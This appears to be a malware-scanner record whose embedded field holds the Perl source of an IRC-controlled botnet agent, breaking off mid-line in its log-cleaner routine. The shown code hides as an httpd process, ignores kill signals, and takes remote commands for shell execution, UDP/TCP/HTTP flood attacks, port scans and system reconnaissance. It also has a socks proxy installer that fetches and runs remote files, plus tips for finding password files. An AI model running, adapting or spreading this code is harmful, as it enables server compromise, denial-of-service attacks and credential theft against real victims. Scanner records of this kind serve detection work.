{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Command": "May run PowerShell commands",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "User-Agent": "May download files from the Internet",
            "Windows": "May enumerate application windows",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "kill": "May delete a file",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/usr/bin/perl\n################\n# Original Design By Pitbul \n#-[B0T Commands List]-\n#-----[Hacking Based]-----\n# !cox @multiscan <vuln> <dork>\n# !cox @socks5\n# !cox @sql2 <vuln> <dork> <col>\n# !cox @portscan <ip>\n# !cox @logcleaner\n# !cox @sendmail <subject> <sender> <recipient> <message>\n# !cox @system\n# !cox @cleartmp\n# !cox @rootable\n# !cox @nmap <ip> <beginport> <endport>\n# !cox @back <ip><port>  \n# !cox @linuxhelp\n# !cox @cd tmp:. | for example\n#-----[Advisory-New Based]-----\n# !cox @packetstorm\n# !cox @milw0rm\n#-----[DDos Based]-----\n# !cox @udpflood <host> <packet size> <time>\n# !cox @tcpflood <host> <port> <packet size> <time>\n# !cox @httpflood <host> <time>\n# !cox @sqlflood <host> <time>\n#-----[IRC Based]-----\n# !cox @killme  \n# !cox @join #channel\n# !cox @part #channel\n# !cox @reset\n# !cox @voice <who>\n# !cox @owner <who>\n# !cox @deowner <who>\n# !cox @dcoxice <who>\n# !cox @halfop <who>\n# !cox @dehalfop <who>\n# !cox @op <who>\n# !cox @deop <who>\n#-----[Flooding Based]-----\n# !cox @msgflood <who>\n# !cox @dccflood <who>\n# !cox @ctcpflood <who>\n# !cox @noticeflood <who>\n# !cox @channelflood\n# !cox @maxiflood <who>\n####################################\nuse HTTP::Request;\nuse LWP::UserAgent;\nmy $processo = '/usr/sbin/httpd';\nmy $linas_max='10';\nmy $sleep='5';\nmy $cmd=\"\";\nmy $id=\"\";\n############################################\nmy @adms=(\"arisNdEso\");\nmy $runner=$adms [rand scalar @adms];\nmy @canais=(\"#cafe\");\nchop (my $nick = `hostname`);\n$nick = &ubah($nick);\nmy $ircname = $nick;\nprint $nick;\nchop (my $realname = `uname -asro`);\n#IRC name and Realname \n$servidor='irc.javairc.org' unless $servidor;\nmy $porta='6667';\n############################################\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n\n#Connect\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\"x16;;\nmy $pid=fork;\nexit if $pid;\ndie \"Masalah fork: $!\" unless defined($pid);\n\nour %irc_servers;\nour %DCC;\nmy $dcc_sel = new IO::Select->new();\n$sel_cliente = IO::Select->new();\nsub sendraw {\n   if ($#_ == '1') {\n      my $socket = $_[0];\n      print $socket \"$_[1]\\n\";\n\n   } else {\n      print $IRC_cur_socket \"$_[0]\\n\";\n   }\n}\n\nsub conectar {\n   my $meunick = $_[0];\n   my $servidor_con = $_[1];\n   my $porta_con = $_[2];\n\n   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\",\n   PeerPort=>$porta_con) or return(1);\n   if (defined($IRC_socket)) {\n      $IRC_cur_socket = $IRC_socket;\n      $IRC_socket->autoflush(1);\n      $sel_cliente->add($IRC_socket);\n      $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n      $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n      nick(\"$meunick\");\n      sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n      sleep 1;\n   }\n}\n\nmy $line_temp;\nwhile( 1 ) {\n   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^\n   delete($irc_servers{''}) if (defined($irc_servers{''}));\n   my @ready = $sel_cliente->can_read(0);\n   next unless(@ready);\n   foreach $fh (@ready) {\n      $IRC_cur_socket = $fh;\n      $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n      $nread = sysread($fh, $msg, 4096);\n      if ($nread == 0) {\n         $sel_cliente->remove($fh);\n         $fh->close;\n         delete($irc_servers{$fh});\n      }\n      @lines = split (/\\n/, $msg);\n      for(my $c=0; $c<= $#lines; $c++) {\n         $line = $lines[$c];\n         $line=$line_temp.$line if ($line_temp);\n         $line_temp='';\n         $line =~ s/\\r$//;\n         unless ($c == $#lines) {\n            parse(\"$line\");\n         } else {\n            if ($#lines == 0) {\n               parse(\"$line\");\n            } elsif ($lines[$c] =~ /\\r$/) {\n               parse(\"$line\");\n            } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n               parse(\"$line\"); \n            } else {\n               $line_temp = $line;\n            }\n         }\n      }\n   }\n}\n\nsub parse {\n   my $servarg = shift;\n   if ($servarg =~ /^PING \\:(.*)/) {\n      sendraw(\"PONG :$1\");\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n      my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;\n      if ($args =~ /^\\001VERSION\\001$/) {\n         notice(\"$pn\", \"\\001VERSION mIRC v6.17 deMoNikz\\001\");\n      }\n      if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms ) {\n         if ($onde eq \"$meunick\"){\n            shell(\"$pn\", \"$args\");\n         }\n#End of Connect\n         if ($args =~ /^(\\Q$meunick\\E|\\!cox)\\s+(.*)/ ) {\n            my $natrix = $1;\n            my $arg = $2;\n            if ($arg =~ /^\\!(.*)/) {\n               ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!cox\" and $arg =~ /^\\!nick/);\n            } elsif ($arg =~ /^\\@(.*)/) {\n               $ondep = $onde;\n               $ondep = $pn if $onde eq $meunick;\n               bfunc(\"$ondep\",\"$1\");\n            } else {\n               shell(\"$onde\", \"$arg\");\n            }\n         }\n      }\n   }\n######################### End of prefix\n   elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\n      if (lc($1) eq lc($meunick)) {\n         $meunick=$4;\n         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n      }\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\n      nick(\"$meunick|\".int rand(999999));\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n      $meunick = $2;\n      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n      $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\n      foreach my $canal (@canais) {\n         sendraw(\"JOIN $canal $key\");\n      }\n   }\n}\n\nsub bfunc {\n   my $printl = $_[0];\n   my $funcarg = $_[1];\n   if (my $pid = fork) {\n      waitpid($pid, 0);\n   } else {\n      if (fork) {\n         exit;\n      } else {\n\n         if ($funcarg =~ /^killme/) {\n            sendraw($IRC_cur_socket, \"QUIT :\");\n            $killd = \"kill -9 \".fork;\n            system (`$killd`);\n         }\n######################\n#                    Commands                      #\n######################\n         if ($funcarg =~ /^commands/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00039-[jerinx B0T Commands List]-\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00038-----[Ready/Hacking Based]-----\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039multiscan <vuln> <dork>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039socks5\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039sql <vuln> <dork>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039portscan <ip>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039logcleaner\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039sendmail <subject> <sender> <recipient> <message>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039system\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039cleartmp\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039rootable\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039nmap <ip> <beginport> <endport>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039back <ip><port>\");   \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039linuxhelp\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039cd tmp:. | for example\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00038-----[Advisory/New Based]-----\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039packetstorm\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039milw0rm\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00038-----[DDos Based]-----\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039udpflood <host> <packet size> <time>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039tcpflood <host> <port> <packet size> <time>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039httpflood <host> <time>\"); \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039sqlflood <host> <time>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00038-----[IRC Based]-----\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039killme\");   \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039join #channel\");   \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039part #channel\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039reset\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039voice <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039owner <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039deowner <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039dcoxice <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039halfop <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039dehalfop <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039op <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039deop <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00038-----[Flooding Based]-----\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039msgflood <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039dccflood <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039ctcpflood <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039noticeflood <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039channelflood\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039maxiflood <who> \");\n}\n\n         if ($funcarg =~ /^linuxhelp/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00038-----[Linux Help]-----\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Dir where you are : pwd\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Start a Perl file : perl file.pl\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Go back from dir : cd ..\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Force to Remove a file/dir : rm -rf file/dir;ls -la\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Show all files/dir with permissions : ls -lia\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Find config.inc.php files : find / -type f -name config.inc.php\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Find all writable folders and files : find / -perm -2 -ls\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Find all .htpasswd files : find / -type f -name .htpasswd\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@ \u00039Find all service.pwd files : find / -type f -name service.pwd\");\n         }\n         \n         if ($funcarg =~ /^help/) {\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00038-----[Help Commands]-----\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039flooding - For IRC Flooding Help\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039irc - For IRC cox Command Help \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039ddos - For DDos Command Help\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039news - For Security News Command Help \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039hacking - For Hacking Command Help\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039linuxhelp - For Linux Help\");\n         }\n\n         if ($funcarg =~ /^flooding/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,1[\u0002\u000314@\u00038-----[Flooding Based]-----\u000314@\u00034\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039msgflood <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039dccflood <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039ctcpflood <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039noticeflood <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039channelflood\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039maxiflood <who> \");\n         }\n         \n         if ($funcarg =~ /^irc/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312,1[\u0002\u000314@\u00038-----[IRC Commands]-----\u000314@\u000312\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039voice <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039owner <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039deowner <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039dcoxice <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039halfop <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039dehalfop <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039op <who> \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039deop <who> \");\n         }   \n         \n         if ($funcarg =~ /^ddos/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312,1[\u0002\u000314@\u00038-----[Ddos Commands]-----\u000314@\u000312\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039udpflood <host> <packet size> <time>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039tcpflood <host> <port> <packet size> <time>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039httpflood <host> <time>\"); \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039sqlflood <host> <time>\");\n         }   \n\n         if ($funcarg =~ /^news/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312,1[\u0002\u000314@\u00038-----[News Commands]-----\u000314@\u000312\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039packetstorm\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039milw0rm\");\n         }   \n\n         if ($funcarg =~ /^hacking/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312,1[\u0002\u000314@\u00038-----[Hacking Commands]-----\u000314@\u000312\u0002] \");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039multiscan <vuln> <dork>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039socks5\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039portscan <ip>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039logcleaner\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039sendmail <subject> <sender> <recipient> <message>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039system\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039cleartmp\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039rootable\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039nmap <ip> <beginport> <endport>\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039back <ip><port>\");   \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039linuxhelp\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034!cox \u000314@\u00039cd tmp:. | for example\");\n         }                  \n######################\n#   End of  Help     #\n######################\n######################\n#     Commands       #\n######################\n         if ($funcarg =~ /^system/) {\n            $uname=`uname -a`;\n            $uptime=`uptime`;\n            $ownd=`pwd`;\n            $distro=`cat /etc/issue`;\n            $id=`id`;\n            $un=`uname -sro`;\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312Info cox : 7 Servidor :Hiden : 6667\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312Uname -a     : \u00034 $uname\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312Uptime       : \u00034 $uptime\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312Own Prosses  : \u00034 $processo\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312ID           : \u00034 $id\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312Own Dir      : \u00034 $ownd\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312OS           : \u00034 $distro\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312Owner        : \u00034 HZ\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00034System Info\u000312:.\u00034| \u000312Channel      : \u00034 #hackzone\");\n         }\n\n         if ($funcarg =~ /^milw0rm/) {\n            my @ltt=();\n            my @bug=();\n            my $x;\n            my $page=\"\";\n            my $socke = IO::Socket::INET->new(PeerAddr=>\"milw0rm.com\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\n            print $socke \"GET http://milw0rm.com/rss.php HTTP/1.0\\r\\nHost: milw0rm.com\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\n            my @r = <$socke>;\n            $page=\"@r\";\n            close($socke);\n            while ($page =~  m/<title>(.*)</g){\n               $x = $1;\n               if ($x =~ /\\&lt\\;/) {\n                  $x =~ s/\\&lt\\;/</g;\n               }         \n               if ($x !~ /milw0rm/) {\n                  push (@bug,$x);\n               }\n            }\n            while ($page =~  m/<link.*expl.*([0-9]...)</g) {\n               if ($1 !~ m/milw0rm.com|exploits|en/){\n                  push (@ltt,\"http://www.milw0rm.com/exploits/$1 \");\n               }\n            }\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00039milw0rm\u000312:.\u00034|\u000312 Latest exploits :\");\n            foreach $x (0..(@ltt - 1)) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00039milw0rm\u000312:.\u00034|\u000312  $bug[$x] - $ltt[$x]\");\n               sleep 1;\n            }\n         }\n######################\n#      Portscan      #\n######################\n         if ($funcarg =~ /^portscan (.*)/) {\n            my $hostip=\"$1\";\n            @portas=(\"15\",\"19\",\"98\",\"20\",\"21\",\"22\",\"23\",\"25\",\"37\",\"39\",\"42\",\"43\",\"49\",\"53\",\"63\",\"69\",\"79\",\"80\",\"101\",\"106\",\"107\",\"109\",\"110\",\"111\",\"113\",\"115\",\"117\",\"119\",\"135\",\"137\",\"139\",\"143\",\"174\",\"194\",\"389\",\"389\",\"427\",\"443\",\"444\",\"445\",\"464\",\"488\",\"512\",\"513\",\"514\",\"520\",\"540\",\"546\",\"548\",\"565\",\"609\",\"631\",\"636\",\"694\",\"749\",\"750\",\"767\",\"774\",\"783\",\"808\",\"902\",\"988\",\"993\",\"994\",\"995\",\"1005\",\"1025\",\"1033\",\"1066\",\"1079\",\"1080\",\"1109\",\"1433\",\"1434\",\"1512\",\"2049\",\"2105\",\"2432\",\"2583\",\"3128\",\"3306\",\"4321\",\"5000\",\"5222\",\"5223\",\"5269\",\"5555\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"7001\",\"7741\",\"8000\",\"8018\",\"8080\",\"8200\",\"10000\",\"19150\",\"27374\",\"31310\",\"33133\",\"33733\",\"55555\");\n            my (@aberta, %porta_banner);\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Port-Scanner\u0002\u000312] Scanning for open ports on \".$1.\" \u000312 started .\");\n            foreach my $porta (@portas)  {\n               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>\n                  'tcp', Timeout => 4);\n               if ($scansock) {\n                  push (@aberta, $porta);\n                  $scansock->close;\n               }\n            }\n \n            if (@aberta) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Port-Scanner\u0002\u000312] Open ports founded: @aberta\");\n            } else {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Port-Scanner\u0002\u000312] No open ports foundend.\");\n            }\n         }\n\n######################\n#  End of  Portscan  #\n#####################\n#####################\n# Chk The News from PacketStorm#\n######################\nif ($funcarg =~ /^packetstorm/) { \n   my $c=0;\n   my $x;\n   my @ttt=();\n   my @ttt1=(); \n   my $sock = IO::Socket::INET->new(PeerAddr=>\"www.packetstormsecurity.org\",PeerPort=>\"80\",Proto=>\"tcp\") or return; \n   print $sock \"GET /whatsnew20.xml HTTP/1.0\\r\\n\";\n   print $sock \"Host: www.packetstormsecurity.org\\r\\n\";\n   print $sock \"Accept: */*\\r\\n\";\n   print $sock \"User-Agent: Mozilla/5.0\\r\\n\\r\\n\"; \n   my @r = <$sock>;\n   $page=\"@r\";\n   close($sock);\n   while ($page =~  m/<link>(.*)<\\/link>/g)\n   {\n           push(@ttt,$1);\n   }\n   while ($page =~  m/<description>(.*)<\\/description>/g)\n   { \n          push(@ttt1,$1);\n   }\n   foreach $x (0..(@ttt - 1))\n   {\n         sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039PacketStorm\u0002\u000312] \".$ttt[$x].\"\u0003 \".$ttt1[$x].\"\");\n      sleep 3;\n      $c++;\n   }\n}\n######################\n#Auto Install Socks V5 using Mocks#\n######################\nif ($funcarg =~ /^socks5/) {\n   sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SocksV5\u0002\u000312]\u000312 Installing Mocks please wait\u00034\");\n      system 'cd /tmp';\n      system 'wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz';\n      system 'tar -xvfz mocks-0.0.2.tar.gz';\n      system 'rm -rf mocks-0.0.2.tar.gz';\n      system 'cd mocks-0.0.2';\n      system 'rm -rf mocks.conf';\n      system 'curl -O http://andromeda.covers.de/221/mocks.conf';\n      system 'touch mocks.log';\n      system 'chmod 0 mocks.log';\n         sleep(2);\n      system './mocks start';\n         sleep(4);\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SocksV5\u0002\u000312]\u000312 Looks like its succesfully installed lets do the last things\u00034   \");\n\n      #lets grab ip\n      $net = `/sbin/ifconfig | grep 'eth0'`;\n      if (length($net))\n      {\n      $net = `/sbin/ifconfig eth0 | grep 'inet addr'`;\n      if (!length($net))\n      {\n      $net = `/sbin/ifconfig eth0 | grep 'inet end.'`;\n      }\n         if (length($net))\n      {\n         chop($net);\n         @netip = split/:/,$net;\n         $netip[1] =~ /(\\d{1,3}).(\\d{1,3}).(\\d{1,3}).(\\d{1,3})/;\n         $ip = $1 .\".\". $2 .\".\". $3 .\".\". $4;\n         \n            #and print it ^^   \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SocksV5\u0002\u000312] Connect here :\u00034 \". $ip .\":8787 \");\n         }\n      else\n   {\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SocksV5\u0002\u000312] IP not founded \");\n   }\n}\nelse\n{\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SocksV5\u0002\u000312] ERROR WHILE INSTALLING MOCKS \");\n}\n}\n######################\n#        Nmap        # \n######################\n   if ($funcarg =~ /^nmap\\s+(.*)\\s+(\\d+)\\s+(\\d+)/){\n         my $hostip=\"$1\";\n         my $portstart = \"$2\";\n         my $portend = \"$3\";\n         my (@abertas, %porta_banner);\n       sendraw($IRC_cur_socket, \"PRIVMSG $printl : Nmap PortScan 12:. 4|  4: $1:. |.: 4Ports 12:.  4 $2-$3\");\n       foreach my $porta ($portstart..$portend){\n               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);\n    if ($scansock) {\n                 push (@abertas, $porta);\n                 $scansock->close;\n                 if ($xstats){\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Nmap\u0002\u000312]  Nmap PortScan :. |Founded  4 $porta\".\"/Open\");\n                 }\n               }\n             }\n             if (@abertas) {\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Nmap\u0002\u000312]  Nmap PortScan 12:. 4| Complete \");\n             } else {\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Nmap\u0002\u000312]  Nmap PortScan 12:. 4| No open ports have been founded  13\");\n             }\n          }\n######################\n#    End of Nmap     # \n######################\n######################\n#    Log Cleaner     # \n######################\nif ($funcarg =~ /^logcleaner/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Log-Cleaner\u0002\u000312]  LogCleaner :. |  This process can be long, just 